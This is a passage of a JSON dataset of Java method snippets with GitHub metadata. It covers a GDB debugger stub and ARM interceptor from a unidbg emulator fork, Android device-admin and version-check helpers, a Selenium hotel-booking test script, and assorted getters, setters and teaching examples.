"public"]}}, {"id": 57477, "method_name": "escapePacketData", "class_name": "GdbStub", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "    private String escapePacketData(String data) {\n        StringBuilder sb = new StringBuilder();\n        for(int i = 0; i < data.length(); i++) {\n            char c = data.charAt(i);\n            if (c == '$' || c == '#' || c == '}') {\n                sb.append(\"}\");\n                sb.append(c ^ 0x20);\n            }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/debugger/gdb/GdbStub.java", "stars": "16", "class_props": {"extends": "AbstractDebugServer", "implements": null, "modifiers": ["final", "public"]}}, {"id": 57478, "method_name": "processInput", "class_name": "GdbStub", "params": ["ByteBuffer"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void processInput(ByteBuffer input) {\n        input.flip();\n\n        while(input.hasRemaining()) {\n            char c = (char) input.get();\n            if (currentInputPacket.length() == 0) {\n                switch (c) {\n                    case '-':\n                        reTransmitLastPacket();\n                        break;\n                    case '+': // Silently discard '+' packets\n                        break;\n                    case 0x3: // Ctrl-C requests\n                        setSingleStep(1);\n                        break;\n                    case '$':\n                        currentInputPacket.append(c);\n                        packetChecksum = 0;\n                        packetFinished = 0;\n                        break;\n                    default:\n                        requestRetransmit();\n                        break;\n\n                }\n            } else {\n                currentInputPacket.append(c);\n                if (packetFinished > 0) {\n                    if (++packetFinished == 3) {\n                        if (checkPacket()) {\n                            processCommand(currentInputPacket.substring(1, currentInputPacket.length() - 3));\n                        } else {\n                            requestRetransmit();\n                        }\n                        currentInputPacket.setLength(0);\n                    }\n                } else if (c == '#') {\n                    packetFinished = 1;\n                } else {\n                    packetChecksum += c;\n                }\n            }\n        }\n\n        input.clear();\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/debugger/gdb/GdbStub.java", "stars": "16", "class_props": {"extends": "AbstractDebugServer", "implements": null, "modifiers": ["final", "public"]}}, {"id": 57479, "method_name": "requestRetransmit", "class_name": "GdbStub", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void requestRetransmit() {\n        send(\"-\");\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/debugger/gdb/GdbStub.java", "stars": "16", "class_props": {"extends": "AbstractDebugServer", "implements": null, "modifiers": ["final", "public"]}}, {"id": 57480, "method_name": "reTransmitLastPacket", "class_name": "GdbStub", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void reTransmitLastPacket() {\n        send(lastPacket);\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/debugger/gdb/GdbStub.java", "stars": "16", "class_props": {"extends": "AbstractDebugServer", "implements": null, "modifiers": ["final", "public"]}}, {"id": 57481, "method_name": "checkPacket", "class_name": "GdbStub", "params": [], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "    private boolean checkPacket() {\n        try {\n            int checksum = Integer.parseInt(currentInputPacket.substring(currentInputPacket.length() - 2), 16);\n            return checksum == (packetChecksum & 0xff);\n        } catch(NumberFormatException ex) {\n            if (log.isDebugEnabled()) {\n                log.debug(\"checkPacket currentInputPacket=\" + currentInputPacket, ex);\n            }\n            return false;\n        }\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/debugger/gdb/GdbStub.java", "stars": "16", "class_props": {"extends": "AbstractDebugServer", "implements": null, "modifiers": ["final", "public"]}}, {"id": 57482, "method_name": "processCommand", "class_name": "GdbStub", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void processCommand(String command) {\n        for(String prefix : commands.keySet()) {\n            if (command.startsWith(prefix)) {\n                GdbStubCommand cmd = commands.get(prefix);\n                if (log.isDebugEnabled()) {\n                    log.debug(\"processCommand command=\" + command + \", cmd=\" + cmd);\n                }\n                if (cmd.processCommand(emulator, this, command)) {\n                    return;\n                }\n            }\n        }\n        if (log.isDebugEnabled()) {\n            log.warn(\"Unsupported command=\" + command);\n        }\n        makePacketAndSend(\"\");\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/debugger/gdb/GdbStub.java", "stars": "16", "class_props": {"extends": "AbstractDebugServer", "implements": null, "modifiers": ["final", "public"]}}, {"id": 57483, "method_name": "onHitBreakPoint", "class_name": "GdbStub", "params": ["Emulator<?>", "long"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onHitBreakPoint(Emulator<?> emulator, long address) {\n        if (isDebuggerConnected()) {\n            makePacketAndSend(\"S\" + SIGTRAP);\n        }\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/debugger/gdb/GdbStub.java", "stars": "16", "class_props": {"extends": "AbstractDebugServer", "implements": null, "modifiers": ["final", "public"]}}, {"id": 57484, "method_name": "onDebuggerExit", "class_name": "GdbStub", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "boolean", "snippet": "    protected boolean onDebuggerExit() {\n        makePacketAndSend(\"W00\");\n        return true;\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/debugger/gdb/GdbStub.java", "stars": "16", "class_props": {"extends": "AbstractDebugServer", "implements": null, "modifiers": ["final", "public"]}}, {"id": 57485, "method_name": "onDebuggerConnected", "class_name": "GdbStub", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onDebuggerConnected() {\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/debugger/gdb/GdbStub.java", "stars": "16", "class_props": {"extends": "AbstractDebugServer", "implements": null, "modifiers": ["final", "public"]}}, {"id": 57486, "method_name": "toString", "class_name": "GdbStub", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String toString() {\n        return \"gdb\";\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/debugger/gdb/GdbStub.java", "stars": "16", "class_props": {"extends": "AbstractDebugServer", "implements": null, "modifiers": ["final", "public"]}}, {"id": 57487, "method_name": "activateDeviceAdmin", "class_name": "devicemanager", "params": ["Activity", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void activateDeviceAdmin(Activity activity, int resultCode){\n\t\tSystem.out.println(\"on activateDeviceAdmin\");\n\t\ttry {\n\t\t\tComponentName comp = new ComponentName(activity, adminreciever.class);\n\t\t\tIntent intent=new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);\n\t\t\tintent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, comp);\n\t\t\tintent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, Html.fromHtml(activity.getResources().getString(R.string.device_admin_manager_message)));\n\t\t\tintent.setFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);\n\t\t\tactivity.startActivityForResult(intent, resultCode);\n\t\t} catch (Exception e) {\n\t\t\te.printStackTrace();\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/uninstallapp/src/com/example/uninstallapp/devicemanager.java", "stars": "74", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57488, "method_name": "deactivateDeviceAdmin", "class_name": "devicemanager", "params": ["Context"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void deactivateDeviceAdmin(Context context){\n\t\ttry {\n\t\t\tComponentName comp = new ComponentName(context, adminreciever.class);\n\t\t\tDevicePolicyManager devicePolicyManager=(DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);\n\t\t\tdevicePolicyManager.removeActiveAdmin(comp);\n\t\t} catch (Exception e) {\n\t\t\te.printStackTrace();\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/uninstallapp/src/com/example/uninstallapp/devicemanager.java", "stars": "74", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57489, "method_name": "isDeviceAdminActive", "class_name": "devicemanager", "params": ["Context"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean isDeviceAdminActive(Context context){\n\t\tboolean flag=false;\n\t\t\n\t\ttry {\n\t\t\tDevicePolicyManager devicePolicyManager=(DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);\n\t\t\tadminreciever adminReciver=new adminreciever();\n\t\t\tflag=devicePolicyManager.isAdminActive(adminReciver.getWho(context));\n\t\t\tisActive=flag;\n\t\t} catch (Exception e) {\n\t\t\te.printStackTrace();\n\t\t}\n\t\t\n\t\treturn flag;\n\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/uninstallapp/src/com/example/uninstallapp/devicemanager.java", "stars": "74", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57490, "method_name": "main", "class_name": "Cat", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) {\n\t\tCar car = new Car();\n\t\tcar.model = \"audi\";\n\t\tcar.drive();\n\t\t\n\t\t//car.turnLeft();\n\t\t//car.name = \"Q6\";\n\t\t//car.year = 2020;\n\t\t//car.price = 39000.99;\n\t}", "url": "https://raw.githubusercontent.com/Suranchiyev/java-sdet-2020/master/src/day8/Cat.java", "stars": "21", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57491, "method_name": "invoke", "class_name": "NonOwnerInvocationHandler", "params": ["Object", "Method", "Object"], "throws": ["Throwable"], "modifiers": ["public"], "return_type": "Object", "snippet": "    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {\n        if (method.getName().startsWith(\"get\")) {\n            return method.invoke(person, args);\n        } else if (method.getName().startsWith(\"set\")) {\n            throw new IllegalAccessException();\n        }\n        return null;\n    }", "url": "https://raw.githubusercontent.com/piyush6348/Design-Patterns/master/Proxy%20Pattern/Protection%20Proxy%20Pattern/src/NonOwnerInvocationHandler.java", "stars": "38", "class_props": {"extends": null, "implements": ["InvocationHandler"], "modifiers": ["public"]}}, {"id": 57492, "method_name": "onRegister", "class_name": "ArmIntercept", "params": ["SvcMemory", "int"], "throws": null, "modifiers": ["public"], "return_type": "UnicornPointer", "snippet": "    public UnicornPointer onRegister(SvcMemory svcMemory, int svcNumber) {\n        try (Keystone keystone = new Keystone(KeystoneArchitecture.Arm, KeystoneMode.Arm)) {\n            KeystoneEncoded encoded = keystone.assemble(\"svc #0x\" + Integer.toHexString(svcNumber));\n            byte[] code = encoded.getMachineCode();\n            pointer.write(0, code, 0, code.length);\n            return null;\n        }\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/arm/ArmIntercept.java", "stars": "16", "class_props": {"extends": "ArmSvc", "implements": null, "modifiers": ["public"]}}, {"id": 57493, "method_name": "handle", "class_name": "ArmIntercept", "params": ["Emulator<?>"], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long handle(Emulator<?> emulator) {\n        Unicorn u = emulator.getUnicorn();\n        if (callback != null) {\n            callback.onIntercept(emulator);\n        }\n        eval(u, emulator);\n        return ((Number) u.reg_read(ArmConst.UC_ARM_REG_R0)).intValue();\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/arm/ArmIntercept.java", "stars": "16", "class_props": {"extends": "ArmSvc", "implements": null, "modifiers": ["public"]}}, {"id": 57494, "method_name": "eval", "class_name": "ArmIntercept", "params": ["Unicorn", "Emulator<?>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void eval(Unicorn u, Emulator<?> emulator) {\n        if (\"push\".equals(insn.mnemonic)) {\n            evalPush(u, emulator);\n        } else {\n            throw new UnicornException(insn.mnemonic + \" \" + insn.opStr);\n        }\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/arm/ArmIntercept.java", "stars": "16", "class_props": {"extends": "ArmSvc", "implements": null, "modifiers": ["public"]}}, {"id": 57495, "method_name": "evalPush", "class_name": "ArmIntercept", "params": ["Unicorn", "Emulator<?>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void evalPush(Unicorn u, Emulator<?> emulator) {\n        Pointer sp = UnicornPointer.register(emulator, ArmConst.UC_ARM_REG_SP);\n        Arm.OpInfo opInfo = (Arm.OpInfo) this.insn.operands;\n        List<Arm.Operand> operandList = new ArrayList<>(opInfo.op.length);\n        Collections.addAll(operandList, opInfo.op);\n        Collections.reverse(operandList);\n        try {\n            for (Arm.Operand operand : operandList) {\n                sp = sp.share(-4);\n                sp.setPointer(0, UnicornPointer.register(emulator, operand.value.reg));\n            }\n        } finally {\n            u.reg_write(ArmConst.UC_ARM_REG_SP, ((UnicornPointer) sp).peer);\n        }\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/arm/ArmIntercept.java", "stars": "16", "class_props": {"extends": "ArmSvc", "implements": null, "modifiers": ["public"]}}, {"id": 57496, "method_name": "main", "class_name": "TC3_Makemytrip", "params": ["String"], "throws": ["InterruptedException"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) throws InterruptedException {\n\n\t\tSystem.setProperty(\"webdriver.chrome.driver\", \"./drivers/chromedriver.exe\");\n\n\t\tChromeOptions options = new ChromeOptions();\n\t\toptions.addArguments(\"--disable-notifications\");\n\t\tChromeDriver driver = new ChromeDriver(options);\n\t\tWebDriverWait wait = new WebDriverWait(driver,30);\n\t\t\n\t\t//1) Go to https://www.makemytrip.com/\n\t\tdriver.get(\"https://www.makemytrip.com/\");\n\t\tdriver.manage().window().maximize();\n\t\tdriver.manage().timeouts().implicitlyWait(30, TimeUnit.SECONDS);\t\t\n\t\t\n\t\t//2) Click Hotels\n\t\tdriver.findElementByXPath(\"(//a[@class='makeFlex hrtlCenter column'])[1]\").click();\n\t\t\n\t\t//3) Enter city as Goa, and choose Goa, India\n\t\tdriver.findElementByXPath(\"(//div[@class='hsw_inner']//div)[1]\").click();\n\t\tThread.sleep(2000);\n\t\tdriver.findElementByXPath(\"//input[@placeholder='Enter city/ Hotel/ Area/ Building']\").sendKeys(\"Goa\");\n\t\tThread.sleep(2000);\n\t\tdriver.findElementByXPath(\"(//p[@class='locusLabel appendBottom5'])[1]\").click();\n\t\t\n\t\t//4) Enter Check in date as Next month 15th (May 15) and Check out as start date+5\n\t\tdriver.findElementByXPath(\"(//div[text()='15'])[2]\").click();\n\t\tString checkin = driver.findElementByXPath(\"(//div[text()='15'])[2]\").getText();\n\t\tSystem.out.println(checkin);\n\t\tint startDate = Integer.parseInt(checkin);\n\t\t\n\t\t//driver.findElementByXPath(\"(//div[text()='20'])[2]\").click();\n\t\tWebElement currentMonth = driver.findElementByXPath(\"(//div[@class='DayPicker-Month'])[2]\");\n\t\tcurrentMonth.findElement(By.xpath(\"(//div[text()='\"+(startDate+5)+\"'])[2]\")).click();\n\t\t\n\t\t//5) Click on ROOMS & GUESTS and click 2 Adults and one Children(age 12). Click Apply Button.\n\t\t//Click on ROOMS & GUESTS\n\t\tdriver.findElementById(\"guest\").click();\n\t\t\n\t\t//click 2 Adults and one Children(age 12)\n\t\tdriver.findElementByXPath(\"(//li[text()='2'])[1]\").click();\n\t\tdriver.findElementByXPath(\"(//li[text()='1'])[2]\").click();\n\t\t\n\t\tWebElement eleAge = driver.findElementByClassName(\"ageSelectBox\");\n\t\tSelect dropdown = new Select(eleAge);\n\t\tdropdown.selectByVisibleText(\"12\");\n\t\tThread.sleep(3000);\n\t\t\n\t\t//Click Apply Button\n\t\t/*JavascriptExecutor js = (JavascriptExecutor)driver;\n\t\tjs.executeScript(\"scroll(0, 250)\");\n\t\tThread.sleep(3000);\n\t\tdriver.findElement(By.xpath(\"//button[text()='APPLY']\")).click();*/\n\t\t\n\t\tWebElement eleApply = driver.findElement(By.xpath(\"//button[text()='APPLY']\"));\n\t\tJavascriptExecutor executor = (JavascriptExecutor)driver;\n\t\texecutor.executeScript(\"arguments[0].click();\", eleApply);\n\t\t\n\t\t//6) Click Search button\n\t\tdriver.findElementById(\"hsw_search_button\").click();\n\t\tThread.sleep(2000);\n\t\tdriver.findElementById(\"root\").click();\n\t\texecutor.executeScript(\"scroll(0, 250)\");\n\t\t\n\t\t//7) Select locality as Baga\n\t\tdriver.findElementByXPath(\"//label[text()='Baga']\").click();\n\t\texecutor.executeScript(\"scroll(0, 1000)\");\n\t\twait.until(ExpectedConditions.elementToBeClickable(By.xpath(\"//label[text()='5 Star']\")));\n\t\t\n\t\t//8) Select 5 start in Star Category under Select Filters\n\t\tdriver.findElementByXPath(\"//label[text()='5 Star']\").click();\n\t\t\n\t\t//9) Click on the first resulting hotel and go to the new window\n\t\tdriver.findElementByXPath(\"(//div[@class='makeFlex spaceBetween']/div)[1]\").click();\n\t\tSet<String> winSet = driver.getWindowHandles();\n\t\tList<String> winList = new ArrayList<String>(winSet);\n\t\tdriver.switchTo().window(winList.get(1));\n\t\t\n\t\t//10) Print the Hotel Name \n\t\tString hotel = driver.findElementById(\"detpg_hotel_name\").getText();\n\t\tSystem.out.println(\"Hotel Name: \"+hotel);\n\t\t\n\t\t//11) Click MORE OPTIONS link and Select 3Months plan and close\n\t\tdriver.findElementByXPath(\"//span[@class='latoBold font10 blueText pointer']\").click();\n\t\tdriver.findElementByXPath(\"(//span[text()='SELECT'])[1]\").click();\n\t\tdriver.findElementByClassName(\"close\").click();\n\t\t\n\t\t//12) Click on BOOK THIS NOW\n\t\tdriver.findElementById(\"detpg_headerright_book_now\").click();\n\t\t\n\t\t//13) Print the Total Payable amount\n\t\tThread.sleep(5000);\n\t\tdriver.findElementByXPath(\"//span[@class='close']\").click();\n\t\tString totalAmount = driver.findElementById(\"revpg_total_payable_amt\").getText();\n\t\tSystem.out.println(\"Total Payable AMount: \"+totalAmount);\n\t\t\n\t\t//14) Close all browsers\n\t\tdriver.quit();\n\t}", "url": "https://raw.githubusercontent.com/Nivashini-J/SeleniumBeginner/master/TC3_Makemytrip.java", "stars": "19", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57497, "method_name": "initialize", "class_name": "AppInitTaskSDKB", "params": ["Context", "StarDriverResult"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void initialize(Context context, StarDriverResult result) {\n        try {\n            Thread.sleep(166);\n        } catch (InterruptedException e) {\n            result.success = false;\n            result.errorMessage = e.toString();\n            return;\n        }\n        result.success = true;\n    }", "url": "https://raw.githubusercontent.com/succlz123/StarDriver-APT/master/app/src/main/java/org/succlz123/stardriver/app/task/AppInitTaskSDKB.java", "stars": "4", "class_props": {"extends": "IStarDriver", "implements": null, "modifiers": ["public"]}}, {"id": 57498, "method_name": "isMarshmallow", "class_name": "VersionUtils", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "    public static boolean isMarshmallow() {\n        return Build.VERSION.SDK_INT >= Build.VERSION_CODES.M;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/utils/VersionUtils.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57499, "method_name": "isLollipop", "class_name": "VersionUtils", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "    public static boolean isLollipop() {\n        return Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/utils/VersionUtils.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57500, "method_name": "isJellyBean", "class_name": "VersionUtils", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "    public static boolean isJellyBean() {\n        return Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/utils/VersionUtils.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57501, "method_name": "isAndroidTV", "class_name": "VersionUtils", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "    public static boolean isAndroidTV() {\n        UiModeManager uiModeManager = (UiModeManager) ButterApplication.getAppContext().getSystemService(Context.UI_MODE_SERVICE);\n        return uiModeManager.getCurrentModeType() == Configuration.UI_MODE_TYPE_TELEVISION;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/utils/VersionUtils.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57502, "method_name": "isUsingCorrectBuild", "class_name": "VersionUtils", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "    public static boolean isUsingCorrectBuild() {\n        String abi;\n        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {\n            abi = Build.CPU_ABI.toLowerCase(Locale.US);\n        } else {\n            abi = Build.SUPPORTED_ABIS[0].toLowerCase(Locale.US);\n        }\n        return BuildConfig.GIT_BRANCH.equalsIgnoreCase(\"local\") ||\n                abi.contains(getBuildAbi());\n\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/utils/VersionUtils.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57503, "method_name": "getBuildAbi", "class_name": "VersionUtils", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String getBuildAbi() {\n        PackageManager manager = ButterApplication.getAppContext().getPackageManager();\n        try {\n            PackageInfo info = manager.getPackageInfo(ButterApplication.getAppContext().getPackageName(), 0);\n            Integer versionCode = info.versionCode;\n\n            if(info.versionName.contains(\"local\")) {\n                return \"local\";\n            }\n\n            if(versionCode > 50000000) {\n                return \"x86\";\n            } else if(versionCode > 30000000) {\n                return \"arm\";\n            }\n        } catch (PackageManager.NameNotFoundException e) {\n            Timber.e(e, \"Couldn't get the build ABI\");\n        }\n\n        return \"unknown\";\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/utils/VersionUtils.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57504, "method_name": "descripcion", "class_name": "ViajeTodoIncluido", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String descripcion() {\n        return \"Disfruta tu viaje todo incluido\";\n    }", "url": "https://raw.githubusercontent.com/santiago9739/Ingenieria-del-software-2/master/src/main/java/co/unicauca/tallerpolimorfismo/modelo/ViajeTodoIncluido.java", "stars": "1", "class_props": {"extends": "Viaje", "implements": null, "modifiers": ["public"]}}, {"id": 57505, "method_name": "onDraw", "class_name": "Practice02StaticLayoutView", "params": ["Canvas"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onDraw(Canvas canvas) {\n        super.onDraw(canvas);\n\n        // \u4f7f\u7528 StaticLayout \u4ee3\u66ff Canvas.drawText() \u6765\u7ed8\u5236\u6587\u5b57\uff0c\n        // \u4ee5\u7ed8\u5236\u51fa\u5e26\u6709\u6362\u884c\u7684\u6587\u5b57\n        canvas.save();\n        canvas.translate(50, 100);\n        staticLayout1.draw(canvas);\n        canvas.translate(0, 300);\n        staticLayout2.draw(canvas);\n        canvas.restore();\n\n    }", "url": "https://raw.githubusercontent.com/Geekholt/Practice-CustomView/master/app/src/main/java/com/geekholt/practiceui/view/lesson3/Practice02StaticLayoutView.java", "stars": "2", "class_props": {"extends": "View", "implements": null, "modifiers": ["public"]}}, {"id": 57506, "method_name": "mockCommandValidatingMessageHandlerInterceptor", "class_name": "AxonTestUtils", "params": ["Validates<?>"], "throws": null, "modifiers": ["public", "static"], "return_type": "CommandValidatingMessageHandlerInterceptor", "snippet": "    public static CommandValidatingMessageHandlerInterceptor mockCommandValidatingMessageHandlerInterceptor(Validates<?>... mockValidators) {\n        var validatorClasses = Arrays.stream(mockValidators).map(e -> e.getClass().getSuperclass()).collect(toList());\n        Map<Class<?>, Validates<?>> validatorLookup = new ConcurrentHashMap<>();\n        for (int i = 0; i < validatorClasses.size(); i++) {\n            Class<?> validator = validatorClasses.get(i);\n            Type validatableCommandType = Arrays.stream(validator.getGenericInterfaces())\n                    .map(e -> (ParameterizedType) e)\n                    .filter(e -> Validates.class == e.getRawType())\n                    .map(e -> e.getActualTypeArguments()[0])\n                    .findFirst().orElseThrow();\n            validatorLookup.put((Class<?>) validatableCommandType, mockValidators[i]);\n        }\n\n        var commandHandlerInterceptor = new CommandValidatingMessageHandlerInterceptor(List.of(), Validation.buildDefaultValidatorFactory().getValidator());\n        try {\n            var validatorLookupField = commandHandlerInterceptor.getClass().getDeclaredField(\"validatorLookup\");\n            validatorLookupField.setAccessible(true);\n            validatorLookupField.set(commandHandlerInterceptor, validatorLookup);\n        } catch (NoSuchFieldException | IllegalAccessException e) {\n            throw new RuntimeException(e);\n        }\n        return commandHandlerInterceptor;\n    }", "url": "https://raw.githubusercontent.com/everest-engineering/lhotse/master/axon-support/src/test/java/engineering/everest/lhotse/axon/AxonTestUtils.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57507, "method_name": "getName", "class_name": "SwaggerModel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getName() {\n        return name;\n    }", "url": "https://raw.githubusercontent.com/pkxing/CodeGenerator/master/CodeGenerator/src/main/java/com/pkx/code/swagger/SwaggerModel.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57508, "method_name": "setName", "class_name": "SwaggerModel", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setName(String name) {\n        this.name = name;\n    }", "url": "https://raw.githubusercontent.com/pkxing/CodeGenerator/master/CodeGenerator/src/main/java/com/pkx/code/swagger/SwaggerModel.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57509, "method_name": "getType", "class_name": "SwaggerModel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getType() {\n        return type;\n    }", "url": "https://raw.githubusercontent.com/pkxing/CodeGenerator/master/CodeGenerator/src/main/java/com/pkx/code/swagger/SwaggerModel.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57510, "method_name": "setType", "class_name": "SwaggerModel", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setType(String type) {\n        this.type = type;\n    }", "url": "https://raw.githubusercontent.com/pkxing/CodeGenerator/master/CodeGenerator/src/main/java/com/pkx/code/swagger/SwaggerModel.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57511, "method_name": "getProperties", "class_name": "SwaggerModel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<SwaggerModelProperties>", "snippet": "    public List<SwaggerModelProperties> getProperties() {\n        return properties;\n    }", "url": "https://raw.githubusercontent.com/pkxing/CodeGenerator/master/CodeGenerator/src/main/java/com/pkx/code/swagger/SwaggerModel.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57512, "method_name": "setProperties", "class_name": "SwaggerModel", "params": ["List<SwaggerModelProperties>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setProperties(List<SwaggerModelProperties> properties) {\n        this.properties = properties;\n    }", "url": "https://raw.githubusercontent.com/pkxing/CodeGenerator/master/CodeGenerator/src/main/java/com/pkx/code/swagger/SwaggerModel.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57513, "method_name": "getDescription", "class_name": "SwaggerModel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getDescription() {\n        return description;\n    }", "url": "https://raw.githubusercontent.com/pkxing/CodeGenerator/master/CodeGenerator/src/main/java/com/pkx/code/swagger/SwaggerModel.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57514, "method_name": "setDescription", "class_name": "SwaggerModel", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDescription(String description) {\n        this.description = description;\n    }", "url": "https://raw.githubusercontent.com/pkxing/CodeGenerator/master/CodeGenerator/src/main/java/com/pkx/code/swagger/SwaggerModel.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57515, "method_name": "main", "class_name": "CompOperators", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) {\n\t\tbigNum(100);\n\t\t// 100 is regular number\n\n\t\tbigNum(2000);\n\t\t// 2000 is big number\n\n\t\tbigNum(1000);\n\n\t\tbadNumber(13);\n\n\t\tbadNumber(7);\n\n\t\tint res = min(99, 78);\n\t\tSystem.out.println(res); // 78\n\n\t\tres = min(1, 4);\n\t\tSystem.out.println(res); // 1\n\n\t}", "url": "https://raw.githubusercontent.com/Suranchiyev/java-sdet-2020/master/src/day7/CompOperators.java", "stars": "21", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57516, "method_name": "min", "class_name": 